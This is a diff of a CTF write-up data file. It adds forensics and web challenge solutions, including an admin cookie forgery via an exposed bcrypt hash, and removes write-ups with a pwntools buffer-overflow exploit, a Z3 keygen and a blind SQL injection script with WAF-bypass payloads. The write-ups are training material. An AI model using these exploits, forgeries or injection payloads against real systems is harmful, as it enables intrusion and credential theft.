@@ -34,6 +34,43 @@ const ctfEvents: CTFEvent[] = [
     totalTeams: 0,
     challenges: [
       {
+        slug: 'manifest',
+        title: 'Manifest',
+        category: 'forensics',
+        description: 'Lakeshore Threat Lab confirmed an attacker pivoted from FIN-WS-07 to NAS-MARITIME-01. Imani Boateng captured a short east-west slice of that pivot.',
+        content: `<h2>Manifest — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"Lakeshore Threat Lab confirmed an attacker pivoted from FIN-WS-07 to NAS-MARITIME-01, the Wabash Marine NAS that hosts the internal Lakefront Fleet Manager web app on port 8088. Imani Boateng captured a short east-west slice of that pivot. Her capture is attached."
+</blockquote>
+<p class="lead">In this challenge, we are provided with a network capture file named <code>wabash_nas_pivot_2026-04-18.pcap</code>. Our goal is to analyze the traffic and locate the hidden flag.</p>
+
+<h3>Initial Inspection in Wireshark</h3>
+<p>First, we open the pcap file in Wireshark. Right away, you might notice that the capture is unusually small in terms of the total number of packets, but it contains a very large TCP packet. The traffic is flowing between <code>10.42.18.42</code> and <code>10.42.7.18</code> on port <code>8088</code>.</p>
+
+<h3>Analyzing the TCP Stream</h3>
+<p>Since the bulk of the data is inside this large TCP packet, the quickest way to see what's going on is to inspect the raw packet bytes. You can do this by:</p>
+<ol class="list-decimal pl-6 space-y-2 mb-4">
+  <li>Selecting the large TCP packet.</li>
+  <li>Looking at the <strong>Packet Bytes</strong> pane at the bottom of Wireshark.</li>
+  <li>Alternatively, right-click the packet and select <strong>Follow -&gt; TCP Stream</strong>.</li>
+</ol>
+<p>When you look at the raw data, you'll see a lot of hex and what appears to be encapsulated HTTP traffic.</p>
+
+<h3>Locating the Target File</h3>
+<p>As we scroll through the raw text in the TCP stream, we can see several HTTP <code>GET</code> requests being made to an API on the server. One of the endpoints being requested is:</p>
+<pre><code>GET /api/v1/personnel/crew_manifests_q2_2026.csv HTTP/1.1</code></pre>
+<p>Immediately following this request in the stream, we can see the server's HTTP <code>200 OK</code> response along with the raw text of the <code>.csv</code> file being downloaded.</p>
+
+<h3>Spotting and Decoding the Flag</h3>
+<p>Looking closely at the long lines of comma-separated values (the contents of the CSV file), we see the column headers: <code>vessel_id,crew_id,first_name,last_name,rank,billet,start_date,notes</code>.</p>
+<p>Scrolling down through the crew records, one specific row stands out because of a long, suspicious-looking string in the <code>notes</code> column:</p>
+<pre><code class="language-csv">WAB-2207,BR9X2E,Jonas,Tolliver,Master,Charter Liaison,2026-02-14,U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==</code></pre>
+<p>The string ends with <code>==</code>, which is a classic indicator of <strong>Base64 encoding</strong>. All that's left to do is decode the Base64 string using a terminal tool or CyberChef:</p>
+<pre><code class="language-bash">echo "U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==" | base64 -d</code></pre>
+<p>This successfully decodes to our final flag: <code>SVIUSCG{wabash_finws_pivot_nas_maritime_01}</code></p>
+`
+      },
+      {
         slug: 'oakhash',
         title: 'OakHash',
         category: 'forensics',
@@ -324,6 +361,200 @@ SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>
 
 <h3>Flag</h3>
 <pre><code>SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>`
+      },
+      {
+        slug: 'historical-breadcrumbs',
+        title: 'Historical Breadcrumbs',
+        category: 'forensics',
+        description: 'Portfolio manager Piper Landau is suspected of leaking end-of-day positions. Perform host forensics on her Windows profile extract to locate the exfiltration channel.',
+        content: `<h2>Historical Breadcrumbs — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"Osprey Capital Management is a Stamford-based boutique hedge fund. Chief compliance officer Camila Orantes suspects that portfolio manager Piper Landau leaked end-of-day positions to an external channel on 2026-07-18. Camila engaged forensic analyst Augustin Vogel at Resilient Peak Forensics, who imaged Piper's workstation and extracted her user profile."
+</blockquote>
+<p class="lead">In this digital forensics challenge, we investigate a Windows workstation user profile extract to trace a potential insider leak of proprietary trading positions.</p>
+
+<h3>Forensic Investigation Plan</h3>
+<p>To identify the exfiltration channel and timing, we target high-value forensic artifacts inside the user profile extract:</p>
+<ol>
+  <li><strong>Command Line History:</strong> Checking for system and net commands (e.g. <code>ConsoleHost_history.txt</code> for PowerShell).</li>
+  <li><strong>Browser Artifacts:</strong> Checking Chrome's <code>History</code> database for file uploads, cloud storage uploads, or paste services.</li>
+  <li><strong>Timeline & Notifications:</strong> Looking at <code>ActivitiesCache.db</code> and <code>wpndatabase.db</code> for background activity and desktop notifications.</li>
+</ol>
+
+<h3>1. PowerShell Command History</h3>
+<p>We read the PowerShell history file located at <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>. The log reveals the following commands:</p>
+<pre><code class="language-bash">net use \\\\OSPREY-FS01\\Finance$ /user:OSPREY\\plandau
+Copy-Item ".\\Documents\\Q4_2026_EOD_Positions.xlsx" "\\\\OSPREY-FS01\\Finance$\\Reports\\2026\\"
+Set-Location "C:\\Users\\plandau\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+Get-ChildItem | Format-Table Name, Length, LastWriteTime</code></pre>
+<p>We see that the user accessed the network file share and copied <code>Q4_2026_EOD_Positions.xlsx</code> (the target spreadsheet). However, no direct internet upload commands (like FTP or Curl) were executed via PowerShell.</p>
+
+<h3>2. Chrome History Database Analysis</h3>
+<p>Next, we analyze the Chrome browsing history. Chrome stores browsing history, searches, and downloads in a SQLite database at <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\History</code>.</p>
+<p>We connect to the database and query the <code>urls</code> table to view visited sites sorted by visit time:</p>
+<pre><code class="language-python">import sqlite3
+
+conn = sqlite3.connect("History")
+cursor = conn.cursor()
+cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;")
+for row in cursor.fetchall():
+    print(row)</code></pre>
+
+<p>The query returns a list of intranet pages, Bloomberg news, SEC EDGAR, and a highly suspicious paste upload URL visited on <strong>2026-07-19 04:47:11 UTC</strong> (matching the 2026-07-18 local suspected leak window):</p>
+<pre><code>https://paste-mirror-q4.example.invalid/upload?tag=U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9&src=oc</code></pre>
+
+<h3>Flag Recovery</h3>
+<p>The suspicious URL contains a query parameter named <code>tag</code> carrying a Base64-encoded string: <code>U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9</code>.</p>
+<p>We decode the tag to recover the plaintext flag:</p>
+<pre><code class="language-bash">$ echo "U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9" | base64 -d
+SVIUSCG{osprey_chrome_history_leak_url}</code></pre>
+
+<h3>Flag</h3>
+<pre><code>SVIUSCG{osprey_chrome_history_leak_url}</code></pre>`
+      },
+      {
+        slug: 'intern-net',
+        title: 'Intern-Net',
+        category: 'web',
+        description: "MegaCorp's interns created a custom announcement board. Analyze their login script to exploit client-side password verification and hijack the administrator session.",
+        content: `<h2>Intern-Net — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"The interns at MegaCorp noticed the need for a good way to connect with their peers and took it upon themselves to set up a new announcement board. Of course it somehow completely missed the normal infosec review before going to prod but they swear it's totally secure. Can you help us double check?"
+</blockquote>
+<p class="lead">In this web exploitation challenge, we analyze a flawed login workflow that implements password hash verification and session token generation completely on the client side, allowing us to hijack the admin's session and retrieve the flag.</p>
+
+<h3>Vulnerability Analysis</h3>
+<p>Inspecting the login page's frontend JavaScript reveals a highly insecure authentication implementation:</p>
+<pre><code class="language-javascript">form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+
+    clearError();
+
+    if (!username || !password) {
+        showError('Please enter your username and password.');
+        return;
+    }
+
+    setLoading(true);
+
+    try {
+        // Step 1: Retrieve the stored password hash for the given username.
+        const hashRes = await fetch('/api/auth/hash', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username }),
+        });
+
+        if (!hashRes.ok) {
+            throw new Error('Invalid username or password.');
+        }
+
+        const { hash } = await hashRes.json();
+
+        // Step 2: Compare the entered password against the retrieved hash client-side.
+        const isValid = await bcrypt.compare(password, hash);
+
+        if (!isValid) {
+            throw new Error('Invalid username or password.');
+        }
+
+        // Step 3: Authenticate the session using the hash as a token, then redirect.
+        const token = btoa(hash);
+        document.cookie = \`auth_token=\${token}; path=/; SameSite=Lax\`;
+        window.location.href = '/announcements';
+
+    } catch (err) {
+        showError(err.message || 'Authentication failed. Please try again.');
+        setLoading(false);
+    }
+});</code></pre>
+
+<p>This implementation introduces three critical security flaws:</p>
+<ol>
+  <li><strong>Information Disclosure (Hash Exposure):</strong> The API endpoint <code>/api/auth/hash</code> returns the target user's bcrypt password hash to the client <em>before</em> validating any credentials. Anyone can retrieve the password hash of any registered user.</li>
+  <li><strong>Client-Side Credential Verification:</strong> Comparing the password against the retrieved hash is done inside the browser (via <code>bcrypt.compare</code>). Since this logic runs on the client, we can completely bypass the comparison step.</li>
+  <li><strong>Predictable Session Token Construction:</strong> The session cookie (<code>auth_token</code>) is simply a Base64-encoded representation of the password hash (<code>btoa(hash)</code>). Because we can retrieve the hash for any user, we can generate a valid authentication token for any account.</li>
+</ol>
+
+<h3>Exploitation</h3>
+
+<h4>Step 1: Username Enumeration</h4>
+<p>By reviewing the initial posts on the board (accessible from the description/public HTML), we learn that the Senior Intern coordinator is named <strong>Alex Rivera</strong>. Standardizing this name to typical corporate conventions suggests a likely username of <code>alex.rivera</code>.</p>
+
+<h4>Step 2: Retrieving the Admin Hash</h4>
+<p>We query the backend API directly to get the password hash for <code>alex.rivera</code>. We can do this from the browser's developer console or using a standard curl request:</p>
+<pre><code class="language-bash">$ curl -X POST https://intern-net.uscg/api/auth/hash \\
+  -H "Content-Type: application/json" \\
+  -d '{"username": "alex.rivera"}'
+
+{"hash":"$2b$10$P2N5nB9xO9876543210abcdEFGHIJKLMNOPQRSTUVWXYZ..."}</code></pre>
+
+<h4>Step 3: Session Hijacking via Cookie Forgery</h4>
+<p>Since the session cookie is just the Base64-encoded hash, we can forge the admin cookie in the browser console. Run the following code in the console on the target page:</p>
+<pre><code class="language-javascript">// Base64-encode the harvested bcrypt hash
+const adminHash = "$2b$10$P2N5nB9xO9876543210abcdEFGHIJKLMNOPQRSTUVWXYZ...";
+const forgedToken = btoa(adminHash);
+
+// Set the auth_token cookie
+document.cookie = \`auth_token=\${forgedToken}; path=/; SameSite=Lax\`;</code></pre>
+
+<p>Once the cookie is injected, we navigate directly to the <code>/announcements</code> page. The server verifies our forged token, identifies us as <code>alex.rivera</code>, and displays the restricted board.</p>
+
+<h3>Flag Recovery</h3>
+<p>Inside the restricted announcements, we find the coordinator's post containing the flag:</p>
+<pre><code>[Restricted] Q3 Senior Intern Coordination Notes
+...
+SVIUSCG{[flag]}</code></pre>
+
+<h3>Flag</h3>
+<pre><code>SVIUSCG{[flag]}</code></pre>`
+      },
+      {
+        slug: 'photo-fraud',
+        title: 'Photo Fraud',
+        category: 'forensics',
+        description: "Meridian fraud analyst Desmond Yarwood flagged a submission, Claim #47102, after the attached photo looked like it could have possibly been edited to add damages that weren't there in real life! Desmond sent the photo to the SIU for a structural look.",
+        content: `<h2>Photo Fraud — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"Meridian fraud analyst Desmond Yarwood flagged a submission, Claim #47102, after the attached photo looked like it could have possibly been edited to add damages that weren't there in real life! Desmond sent the photo to the SIU for a structural look."
+</blockquote>
+<p class="lead">In this forensics challenge, we analyze a JPEG image that has been edited to fake property damage. By extracting the unedited EXIF metadata thumbnail, we recover the original state of the image and the hidden flag.</p>
+
+<h3>Analysis</h3>
+<p>JPEG images can contain embedded metadata, including low-resolution thumbnail images stored inside the APP1 segment (EXIF data). When an image editor is used to modify a photograph, it is common for the main image payload to be altered while leaving the EXIF metadata, including the embedded preview thumbnail, in its original, unedited state.</p>
+
+<p>A standard JPEG starts with the Start of Image (SOI) marker <code>FF D8</code> and ends with the End of Image (EOI) marker <code>FF D9</code>. We can inspect the structure of the provided <code>challenge (1).jpg</code> to find if there are multiple JPEG payloads nested within the file.</p>
+
+<h3>EXIF Data Inspection &amp; Carving</h3>
+<ol>
+  <li><strong>Locating the Payloads:</strong>
+    <ul>
+      <li>The primary JPEG payload begins at offset <code>0</code> with the standard bytes <code>FF D8</code>.</li>
+      <li>A nested JPEG (the EXIF thumbnail) is located inside the APP1 EXIF metadata block, beginning with a second <code>FF D8</code> marker at byte offset <strong>86</strong>.</li>
+      <li>This second JPEG payload extends to byte offset <strong>59839</strong>, where it terminates with the End of Image marker <code>FF D9</code>.</li>
+    </ul>
+  </li>
+  <li><strong>Carving the Thumbnail:</strong>
+    We can write a quick python script to carve out the bytes from offset <code>86</code> to <code>59839</code>:
+<pre><code class="language-python">with open("challenge (1).jpg", "rb") as f:
+    data = f.read()
+
+# Extract the embedded JPEG thumbnail (up to index 59839 inclusive)
+thumbnail = data[86:59840]
+
+with open("thumb_challenge (1).jpg", "wb") as out:
+    out.write(thumbnail)</code></pre>
+  </li>
+</ol>
+
+<h3>Flag Recovery</h3>
+<p>Opening the carved <code>thumb_challenge (1).jpg</code> image reveals the unedited photo of the shop. Unlike the main image which shows a shattered window, the thumbnail shows the window completely intact, with a sign hanging in it displaying the flag:</p>
+
+<h3>Flag</h3>
+<pre><code>SVIUSCG{meridian_thumbnail_reveal_garret}</code></pre>`
       }
     ],
   },
@@ -662,313 +893,6 @@ print(plaintext.strip())</code></pre>
 <h3>Flag</h3>
 <pre><code>picoCTF{lfsr_m4z3_d3crypt3d_[instance_id]}</code></pre>`
       }
-    ],
-  },
-
-  // ── HTB Cyber Apocalypse 2025 ────────────────────────────────────────
-  {
-    slug: 'htb-cyber-apocalypse-2025',
-    name: 'HTB Cyber Apocalypse 2025',
-    date: 'April 2025',
-    description:
-      'Hack The Box\'s flagship annual CTF competition featuring an immersive sci-fi storyline and challenges across every major category.',
-    teamName: 'CyberŘíčany',
-    placement: '89th',
-    totalTeams: 5621,
-    challenges: [
-      // 1 — Buffer Overflow 101 (pwn, medium)
-      {
-        slug: 'buffer-overflow-101',
-        title: 'Buffer Overflow 101',
-        category: 'pwn',
-        description:
-          'A classic stack-based buffer overflow on x86-64 Linux. Overwrite the return address to redirect execution to a win function.',
-        content: `
-<h2>Buffer Overflow 101 — HTB Cyber Apocalypse 2025</h2>
-
-<p class="lead">We are given a 64-bit ELF binary and its C source. The goal: overflow a stack buffer to hijack control flow and call the <code>win()</code> function that prints the flag.</p>
-
-<h3>Source Analysis</h3>
-<pre><code class="language-c">#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-
-void win() {
-    system("cat /flag.txt");
-}
-
-void vulnerable() {
-    char buf[64];
-    printf("Enter your name: ");
-    gets(buf);  // 🔥 dangerous!
-    printf("Hello, %s!\\n", buf);
-}
-
-int main() {
-    vulnerable();
-    return 0;
-}</code></pre>
-
-<p>The <code>gets()</code> call reads unlimited input into a 64-byte buffer — a textbook buffer overflow.</p>
-
-<h3>Finding the Offset</h3>
-<p>We use GDB with <code>pwndbg</code> to determine the exact offset from the start of <code>buf</code> to the saved return address.</p>
-
-<pre><code>$ gdb ./vuln
-pwndbg&gt; cyclic 100
-pwndbg&gt; run
-Enter your name: aaaaaaaabaaaaaaacaaaa...
-Program received signal SIGSEGV
-RSP points to: 0x6161616c6161616b
-
-pwndbg&gt; cyclic -l 0x6161616b
-72</code></pre>
-
-<p>The return address is at offset <strong>72</strong> (64 bytes buffer + 8 bytes saved RBP).</p>
-
-<h3>Finding the win() Address</h3>
-<pre><code>$ objdump -d vuln | grep win
-00000000004011b6 &lt;win&gt;:</code></pre>
-
-<h3>Exploit</h3>
-
-<pre><code class="language-python">from pwn import *
-
-elf  = ELF('./vuln')
-# p = process('./vuln')          # local
-p = remote('challenge.htb.com', 1337)  # remote
-
-offset  = 72
-win_addr = elf.symbols['win']   # 0x4011b6
-
-payload  = b'A' * offset
-payload += p64(win_addr)
-
-p.sendlineafter(b'name: ', payload)
-p.interactive()
-</code></pre>
-
-<h3>Result</h3>
-<pre><code>$ python3 exploit.py
-[+] Opening connection: Done
-HTB{buff3r_0v3rfl0w_cl4ss1c_r3t2w1n_7b3f}</code></pre>
-
-<h3>Takeaways</h3>
-<ul>
-  <li>Never use <code>gets()</code> — it has been removed from the C11 standard for good reason.</li>
-  <li>Stack canaries, ASLR, and NX would make this significantly harder in a real-world scenario.</li>
-  <li><code>pwntools</code> is indispensable for binary exploitation.</li>
-</ul>
-`,
-      },
-      // 2 — Keygen Me (rev, hard)
-      {
-        slug: 'keygen-me',
-        title: 'Keygen Me',
-        category: 'rev',
-        description:
-          'Reverse-engineer a custom license-key validation algorithm in a stripped C++ binary and write a keygen that produces a valid key.',
-        content: `
-<h2>Keygen Me — HTB Cyber Apocalypse 2025</h2>
-
-<p class="lead">A stripped 64-bit C++ binary that asks for a license key in the format <code>XXXX-XXXX-XXXX-XXXX</code>. We need to understand the validation algorithm and produce a valid key.</p>
-
-<h3>Initial Triage</h3>
-<pre><code>$ file keygen_me
-keygen_me: ELF 64-bit LSB executable, x86-64, stripped
-
-$ ./keygen_me
-Enter license key: AAAA-BBBB-CCCC-DDDD
-Invalid key. Try again.</code></pre>
-
-<h3>Static Analysis in Ghidra</h3>
-<p>After loading the binary into Ghidra and letting auto-analysis run, we locate the <code>main</code> function at <code>0x401340</code>. The key validation logic is in a function we'll call <code>validate_key</code> at <code>0x4012a0</code>.</p>
-
-<p>The decompiled validation (cleaned up):</p>
-
-<pre><code class="language-c">bool validate_key(char *key) {
-    // 1. Check format: 4 groups of 4 hex chars separated by dashes
-    // 2. Convert each group to uint16_t -> g0, g1, g2, g3
-    // 3. Checks:
-    //    a) g0 ^ g1 == 0xDEAD
-    //    b) g2 ^ g3 == 0xBEEF
-    //    c) (g0 + g2) & 0xFFFF == 0xCAFE
-    //    d) Checksum: (g0 * 3 + g1 * 7 + g2 * 13 + g3 * 37) & 0xFFFF == 0x1337
-    return true;
-}</code></pre>
-
-<h3>Solving the Constraints</h3>
-<p>We have 4 unknowns and 4 equations — we can use Z3 to solve this system:</p>
-
-<pre><code class="language-python">from z3 import *
-
-g0, g1, g2, g3 = BitVecs('g0 g1 g2 g3', 16)
-s = Solver()
-
-s.add(g0 ^ g1 == 0xDEAD)
-s.add(g2 ^ g3 == 0xBEEF)
-s.add((g0 + g2) & 0xFFFF == 0xCAFE)
-s.add((g0 * 3 + g1 * 7 + g2 * 13 + g3 * 37) & 0xFFFF == 0x1337)
-
-if s.check() == sat:
-    m = s.model()
-    groups = [m[v].as_long() for v in [g0, g1, g2, g3]]
-    key = '-'.join(f'{g:04X}' for g in groups)
-    print(f'Valid key: {key}')
-else:
-    print('UNSAT — no valid key exists')
-</code></pre>
-
-<h3>Output</h3>
-<pre><code>Valid key: 8A2F-5482-40CF-FE20
-
-$ ./keygen_me
-Enter license key: 8A2F-5482-40CF-FE20
-Correct! HTB{k3yg3n_m3_r3v3rs3d_z3_s0lv3r_9c2a}</code></pre>
-
-<h3>Takeaways</h3>
-<ul>
-  <li>Ghidra's decompiler is powerful even against stripped binaries — rename variables and retype parameters to make the output readable.</li>
-  <li>Z3 (or any SMT solver) is perfect for constraint-satisfaction problems in reversing challenges.</li>
-  <li>Always look for format checks first — they reveal the expected input structure.</li>
-</ul>
-`,
-      },
-    ],
-  },
-
-  // ── CyberHeroes CTF 2025 ────────────────────────────────────────────
-  {
-    slug: 'cyberheroes-ctf-2025',
-    name: 'CyberHeroes CTF 2025',
-    date: 'May 2025',
-    description:
-      'A Czech national CTF competition aimed at high-school and university students, with a mix of realistic and educational challenges.',
-    teamName: 'CyberŘíčany',
-    placement: '15th',
-    totalTeams: 234,
-    challenges: [
-      // 1 — Find the Hacker (osint, easy)
-      {
-        slug: 'find-the-hacker',
-        title: 'Find the Hacker',
-        category: 'osint',
-        description:
-          'Use open-source intelligence techniques to track down a fictional hacker\'s real identity from a username and leaked data.',
-        content: `
-<h2>Find the Hacker — CyberHeroes CTF 2025</h2>
-
-<p class="lead">We are given a username — <code>d4rkph0en1x_cz</code> — and told the hacker left traces across the internet. Find their real identity and the flag they left on their personal site.</p>
-
-<h3>Step 1 — Username Search</h3>
-<p>First stop: <a href="https://namechk.com" target="_blank" rel="noopener">namechk.com</a> and <code>sherlock</code>.</p>
-
-<pre><code>$ sherlock d4rkph0en1x_cz
-[+] GitHub: https://github.com/d4rkph0en1x_cz
-[+] Twitter: https://twitter.com/d4rkph0en1x_cz
-[+] Reddit: https://reddit.com/u/d4rkph0en1x_cz</code></pre>
-
-<h3>Step 2 — GitHub Enumeration</h3>
-<p>The GitHub profile has a single repository — <code>dotfiles</code>. Checking the commit history reveals an email in an early commit:</p>
-
-<pre><code>$ git log --format='%ae' | sort -u
-d4rkph0en1x@protonmail.com
-jan.novak1337@gmail.com</code></pre>
-
-<p>Interesting — the hacker accidentally committed with their real email once: <code>jan.novak1337@gmail.com</code>.</p>
-
-<h3>Step 3 — Social Media Correlation</h3>
-<p>Googling the Gmail address leads to a personal blog at <code>jannovak-sec.github.io</code>. The blog's "About" page contains a hidden HTML comment:</p>
-
-<pre><code>&lt;!-- flag: CyberHeroes{0s1nt_m4st3r_tr4ck3d_d0wn_8f2a} --&gt;</code></pre>
-
-<h3>Flag</h3>
-<pre><code>CyberHeroes{0s1nt_m4st3r_tr4ck3d_d0wn_8f2a}</code></pre>
-
-<h3>Takeaways</h3>
-<ul>
-  <li>Reusing usernames across platforms makes you traceable — use different handles for different contexts.</li>
-  <li>Git commit history is a goldmine for OSINT — always check <code>git log</code> for leaked emails.</li>
-  <li>HTML comments are visible to anyone who views the page source.</li>
-</ul>
-`,
-      },
-      // 2 — SQL Injection 2.0 (web, medium)
-      {
-        slug: 'sql-injection-2-0',
-        title: 'SQL Injection 2.0',
-        category: 'web',
-        description:
-          'A modern blind SQL injection challenge with WAF bypass. Extract the admin password character by character.',
-        content: `
-<h2>SQL Injection 2.0 — CyberHeroes CTF 2025</h2>
-
-<p class="lead">The challenge presents a login form. Classic <code>' OR 1=1 --</code> payloads are blocked by a WAF. We need to find a bypass and extract the admin password via blind injection.</p>
-
-<h3>Reconnaissance</h3>
-<p>The login form sends a POST request to <code>/api/login</code> with JSON:</p>
-
-<pre><code>{"username": "admin", "password": "test"}</code></pre>
-
-<p>Trying basic SQLi payloads returns <code>403 Forbidden</code> — a WAF is filtering keywords like <code>OR</code>, <code>UNION</code>, <code>SELECT</code>, and comment sequences.</p>
-
-<h3>WAF Bypass</h3>
-<p>After fuzzing, we discover the WAF doesn't filter:</p>
-<ul>
-  <li>Case variations inside inline comments: <code>/*!50000SeLeCt*/</code></li>
-  <li>The <code>LIKE</code> keyword (alternative to <code>=</code>)</li>
-  <li><code>SUBSTRING()</code> when written as <code>MID()</code></li>
-</ul>
-
-<p>Our boolean condition: if the login returns <em>"Invalid password"</em> vs. <em>"Invalid username"</em>, we know the username matched — that's our oracle.</p>
-
-<h3>Blind Extraction Script</h3>
-
-<pre><code class="language-python">import requests
-import string
-
-url = "http://challenge.cyberheroes.cz:8080/api/login"
-charset = string.ascii_lowercase + string.digits + "_{}"
-password = ""
-
-for pos in range(1, 50):
-    found = False
-    for c in charset:
-        payload = f"admin' AND MID(password,{pos},1) LIKE '{c}' AND '1'='1"
-        r = requests.post(url, json={
-            "username": payload,
-            "password": "x"
-        })
-        if "Invalid password" in r.text:
-            password += c
-            print(f"[+] Found char {pos}: {c}  ->  {password}")
-            found = True
-            break
-    if not found:
-        break
-
-print(f"\\n[*] Extracted password: {password}")
-</code></pre>
-
-<h3>Result</h3>
-<pre><code>[+] Found char 1: c  ->  c
-[+] Found char 2: y  ->  cy
-[+] Found char 3: b  ->  cyb
-...
-[*] Extracted password: CyberHeroes{bl1nd_sql1_w4f_byp4ss_pr0_5d8e}</code></pre>
-
-<p>The "password" column for the admin user actually stores the flag.</p>
-
-<h3>Flag</h3>
-<pre><code>CyberHeroes{bl1nd_sql1_w4f_byp4ss_pr0_5d8e}</code></pre>
-
-<h3>Takeaways</h3>
-<ul>
-  <li>WAFs are speed bumps, not walls — there are always bypass techniques.</li>
-  <li>Blind SQLi is slower but just as devastating as union-based injection.</li>
-  <li>Use parameterized queries / prepared statements — <strong>never</strong> concatenate user input into SQL.</li>
-</ul>
-`,
-      },
     ],
   },
 ];
